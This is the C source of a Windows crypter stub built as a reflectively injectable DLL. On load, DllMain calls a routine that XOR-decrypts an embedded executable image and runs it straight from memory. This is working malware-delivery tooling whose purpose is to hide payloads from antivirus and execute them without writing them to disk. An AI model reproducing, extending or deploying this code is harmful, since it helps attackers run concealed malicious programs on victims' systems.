#include <windows.h>
#include <stdio.h>

#include "main.h"

#include "pe_image.h"
#include "ReflectiveDLLInjection/dll/ReflectiveLoader.h"

extern HINSTANCE hAppInstance;

int crypter_main() {
  int i, x;
  char exec_file_path[1024];
  unsigned char decrypted_bytes[array_len+1] = {};

  for (i = 0; i < array_len; i++) {
    if (image_crypt[i] == null_key) {
      decrypted_bytes[i] = 0x00;
      image_crypt[i] = '\0';
    } else if (image_crypt[i] != null_key) {
      decrypted_bytes[i] = key ^ image_crypt[i];
      image_crypt[i] = '\0';
    }
  }

  GetModuleFileNameA(0, exec_file_path, 1024);
  RunFromMemory((char*)decrypted_bytes, exec_file_path);
  return 0;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
  switch( dwReason )
    {
    case DLL_QUERY_HMODULE:
      if( lpReserved != NULL )
        *(HMODULE *)lpReserved = hAppInstance;
      break;
    case DLL_PROCESS_ATTACH:
      hAppInstance = hinstDLL;
      crypter_main();
      break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
            break;
    }
  return bReturnValue;
}
